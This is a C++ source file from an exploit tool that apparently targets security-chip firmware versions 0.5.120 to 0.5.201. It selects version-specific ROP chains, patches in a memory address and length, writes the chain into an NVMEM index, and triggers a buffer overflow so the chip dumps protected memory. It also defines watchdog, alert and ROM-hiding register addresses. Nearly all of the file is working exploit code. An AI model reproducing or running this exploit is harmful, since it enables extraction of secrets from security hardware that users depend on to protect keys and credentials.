#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fcntl.h>
#include <iostream>
#include <unistd.h>
#include <vector>

#include "args.h"
#include "nvmem.hh"

/* Import our ROP chains. */
#define THUMB_BIT 1
#define BIT(nr) (1UL << (nr))

// REGISTER DEFINTIONS
#define GC_WATCHDOG_BASE 0x40500000
#define GC_GLOBALSEC_BASE 0x40090000
#define GC_WATCHDOG_WDOGLOCK (GC_WATCHDOG_BASE + 0xc00)
#define GC_WATCHDOG_WDOGCONTROL (GC_WATCHDOG_BASE + 0x8)
#define GC_GLOBALSEC_ALERT_CONTROL (GC_GLOBALSEC_BASE + 0x405c)
#define GC_GLOBALSEC_HIDE_ROM (GC_GLOBALSEC_BASE + 0x40d0)

#define LEAK_DATA_ADDRESS_MAGIC 0x0add4e55
#define LEAK_DATA_SIZE_MAGIC 0xb1750000

#include "rop.hh"
#include "rop-0-5-120.h"
#include "rop-0-5-153.h"
#include "rop-0-5-201.h"

using namespace std;

static void set_address_spaces(uint32_t *buf, uint32_t buf_len, 
							uint32_t adr, uint32_t len)
{
	for (int i = 0; i < (buf_len / sizeof(uint32_t)); ++i) {
		if (buf[i] == LEAK_DATA_ADDRESS_MAGIC)
			buf[i] = adr;
		if (buf[i] == LEAK_DATA_SIZE_MAGIC)
			buf[i] = len;
	}
}

static uint8_t *get_dataleak_chain(std::string ver, uint32_t adr, uint32_t len, size_t &out_size)
{
	static std::vector<uint8_t> ropbuf;
	
	const uint32_t *main_chain = nullptr; // ROP chain with the main payload.
	const uint32_t *init_chain = nullptr; // ROP chain used to gain more stack space.
	uint32_t main_size = 0;
	uint32_t init_size = 0;

	if (ver == "0.5.120") {
		main_chain = leak_data_main_ropchain_0_5_120;
		init_chain = init_ropchain_0_5_120;

		main_size = sizeof(leak_data_main_ropchain_0_5_120);
		init_size = sizeof(init_ropchain_0_5_120);
		
	} else if (ver == "0.5.153") {
		main_chain = leak_data_main_ropchain_0_5_153;
		init_chain = init_ropchain_0_5_153;

		main_size = sizeof(leak_data_main_ropchain_0_5_153);
		init_size = sizeof(init_ropchain_0_5_153);

	} else if (ver == "0.5.201") {
		main_chain = leak_data_main_ropchain_0_5_201;
		init_chain = init_ropchain_0_5_201;

		main_size = sizeof(leak_data_main_ropchain_0_5_201);
		init_size = sizeof(init_ropchain_0_5_201);

	} else {
		return nullptr;
	}
	
	ropbuf.resize(1024 + init_size);
	memcpy(ropbuf.data(), main_chain, main_size);
	memcpy(&ropbuf[1024], init_chain, init_size);
	
	set_address_spaces((uint32_t *) ropbuf.data(), 1024 + init_size, adr, len);
	out_size = 1024 + init_size;
	return ropbuf.data();
}

int execute_rop_chain(enum rop_chain_type rop_type)
{
	std::string ver = fval("version", 1);
	uint8_t* ropbuf = NULL;
	size_t ropbuf_size;

	if (rop_type == rop_chain_type::DATALEAK_CHAIN) {
		uint32_t dump_addr, dump_len;
		dump_addr = strtoul(fval("dump_addr", 1), nullptr, 0);
		dump_len = strtoul(fval("dump_addr", 2), nullptr, 0);

		printf("Dumping 0x%x - 0x%x to the console.\n", dump_addr, dump_len);

		ropbuf = get_dataleak_chain(ver, dump_addr, dump_len, ropbuf_size);
	};
	
	if (!ropbuf) {
		std::cerr << "Error: Failed to get a ROP chain!!" << std::endl;
		return -1;
	}

	nvmem_write(0x80000A, 0, ropbuf, 1024);
	nvmem_write(0x80000A, 1024, &ropbuf[1024], ropbuf_size - 1024);

	// Trigger the overflow, the ROP should return the requested data.
	nvmem_read(0x80000A, 0, ropbuf_size);

	return 0;
}